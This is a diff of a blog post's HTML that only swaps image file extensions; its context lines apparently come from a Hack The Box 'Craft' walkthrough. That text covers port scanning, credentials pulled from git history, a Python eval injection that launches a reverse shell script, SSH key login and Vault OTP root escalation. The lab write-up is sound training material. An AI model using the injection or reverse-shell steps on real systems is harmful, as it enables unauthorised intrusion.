@@ -136,7 +136,7 @@
 <p><em>Today I'm going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.</em></p>
 
     <figure class="left" >
-        <img src="image-8.webp"   />
+        <img src="image-8.png"   />
 
         
     </figure>
@@ -158,7 +158,7 @@
 <p><code>ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.110 | grep [1] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) nmap -sC -sV -p $ports 10.10.10.110</code></p>
 
     <figure class="left" >
-        <img src="image-9.webp"   />
+        <img src="image-9.png"   />
 
         
     </figure>
@@ -180,7 +180,7 @@
 <p>After navigating to <code>https://10.10.10.110</code>, and continuing past the certificate error, I am presented with a clean interface for an API.</p>
 
     <figure class="left" >
-        <img src="image-10.webp"   />
+        <img src="image-10.png"   />
 
         
     </figure>
@@ -193,7 +193,7 @@
 <p>The API page shows a nice interface which was created with <code>swagger</code></p>
 
     <figure class="left" >
-        <img src="image-11.webp"   />
+        <img src="image-11.png"   />
 
         
     </figure>
@@ -205,7 +205,7 @@
 <p>Remember when I said never underestimate simple exploration? This is why:</p>
 
     <figure class="left" >
-        <img src="image-16.webp"   />
+        <img src="image-16.png"   />
 
         
     </figure>
@@ -216,7 +216,7 @@
 <p>First I decided to check the DB test for credentials:</p>
 
     <figure class="left" >
-        <img src="image-17.webp"   />
+        <img src="image-17.png"   />
 
         
     </figure>
@@ -225,7 +225,7 @@
 <p>No luck, they are grabbing the data from a settings file, which is not present on the git repository. But there's still a chance the credentials were included in an older commit, so let's take a look at the commit history and see what stands out.</p>
 
     <figure class="left" >
-        <img src="image-18.webp"   />
+        <img src="image-18.png"   />
 
         
     </figure>
@@ -234,7 +234,7 @@
 <p>Cleanup test looks suspicious, I wonder what was cleaned from it?</p>
 
     <figure class="left" >
-        <img src="image-19.webp"   />
+        <img src="image-19.png"   />
 
         
     </figure>
@@ -244,7 +244,7 @@
 <p>Credentials alone won't be enough to get into the machine, but it's a start. The next step is figuring out what I can do with these credentials. Looking at the <code>issues</code> page is a good starting point.</p>
 
     <figure class="left" >
-        <img src="image-20.webp"   />
+        <img src="image-20.png"   />
 
         
     </figure>
@@ -253,7 +253,7 @@
 <p>Ah, the personality in this box is awesome. Gilfoyle is taking a stab at Dinesh, completely in line with something he would do on the show. What's so bad about Dinesh's patch though?</p>
 
     <figure class="left" >
-        <img src="image-21.webp"   />
+        <img src="image-21.png"   />
 
         
     </figure>
@@ -325,7 +325,7 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 <p><code>python -m SimpleHTTPServer</code></p>
 
     <figure class="left" >
-        <img src="image.webp"   />
+        <img src="image.png"   />
 
         
     </figure>
@@ -338,7 +338,7 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 <p>And finally check the if our server was accessed:</p>
 
     <figure class="left" >
-        <img src="image-1.webp"   />
+        <img src="image-1.png"   />
 
         
     </figure>
@@ -346,7 +346,7 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 
 
     <figure class="left" >
-        <img src="swanson.webm"   />
+        <img src="swanson.gif"   />
 
         
     </figure>
@@ -366,7 +366,7 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 <p>I found one here: <a href="https://github.com/trackmastersteve/shell">https://github.com/trackmastersteve/shell</a>, changed the IP/Port info in both files, started the listener, and executed the following command on the victim:<code>brew_dict['abv'] = '**import**(&quot;os&quot;).system(&quot;python3 ./shell.py&quot;)'</code></p>
 
     <figure class="left" >
-        <img src="image-3.webp"   />
+        <img src="image-3.png"   />
 
         
     </figure>
@@ -374,7 +374,7 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 
 
     <figure class="left" >
-        <img src="2.webm"   />
+        <img src="2.gif"   />
 
         
     </figure>
@@ -444,7 +444,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p>No luck with SSH. I tried both port 22, and 6022 but was denied in both. They might work in gogs however.</p>
 
     <figure class="left" >
-        <img src="image-4.webp"   />
+        <img src="image-4.png"   />
 
         
     </figure>
@@ -453,7 +453,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p>And&hellip; success! It looks like Gilfoyle has some non-public repos to explore. I took a look at the nginx config file and found a new vhost: <code>vault.craft.htb</code> I added it to <code>/etc/hosts</code> and took a look.</p>
 
     <figure class="left" >
-        <img src="image-5.webp"   />
+        <img src="image-5.png"   />
 
         
     </figure>
@@ -463,7 +463,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p>Well&hellip; What's this??</p>
 
     <figure class="left" >
-        <img src="1578158745.webp"   />
+        <img src="1578158745.png"   />
 
         
     </figure>
@@ -473,7 +473,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p><code>root@wks104:~/craft# chmod 600 gilfoyle.keyroot@wks104:~/craft# ssh gilfoyle@craft.htb -i gilfoyle.key</code></p>
 
     <figure class="left" >
-        <img src="image-6.webp"   />
+        <img src="image-6.png"   />
 
         
     </figure>
@@ -481,7 +481,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 
     <figure class="left" >
-        <img src="thumbsup.webm"   />
+        <img src="thumbsup.gif"   />
 
         
     </figure>
@@ -495,7 +495,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p>Looks like this one has bash:</p>
 
     <figure class="left" >
-        <img src="image-7.webp"   />
+        <img src="image-7.png"   />
 
         
     </figure>
@@ -506,7 +506,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p><code>sudo -l</code></p>
 
     <figure class="left" >
-        <img src="image-8.1.webp"   />
+        <img src="image-8.1.png"   />
 
         
     </figure>
@@ -515,7 +515,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p>No sudo on this machine. Now normally I would proceed to use both LinuxEnum.sh and linuxprivchecker.py, but something stuck out when I was trifling through Gilfoyle's git branch.</p>
 
     <figure class="left" >
-        <img src="image-91.webp"   />
+        <img src="image-91.png"   />
 
         
     </figure>
@@ -527,7 +527,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p><code>vault secrets list</code></p>
 
     <figure class="left" >
-        <img src="image-101.webp"   />
+        <img src="image-101.png"   />
 
         
     </figure>
@@ -537,7 +537,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p><code>root@craft:~# vault list /cubbyhole</code></p>
 
     <figure class="left" >
-        <img src="image-111.webp"   />
+        <img src="image-111.png"   />
 
         
     </figure>
@@ -555,7 +555,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p><code>vault ssh -role root_otp -mode otp root@localhost</code></p>
 
     <figure class="left" >
-        <img src="image-12.webp"   />
+        <img src="image-12.png"   />
 
         
     </figure>
@@ -564,7 +564,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p>Ah ha! I have a password prompt, and an OTP. So copy and paste OTP, cross fingers&hellip;</p>
 
     <figure class="left" >
-        <img src="image1.webp"   />
+        <img src="image1.png"   />
 
         
     </figure>
@@ -572,7 +572,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 
     <figure class="left" >
-        <img src="success.webm"   />
+        <img src="success.gif"   />
 
         
     </figure>
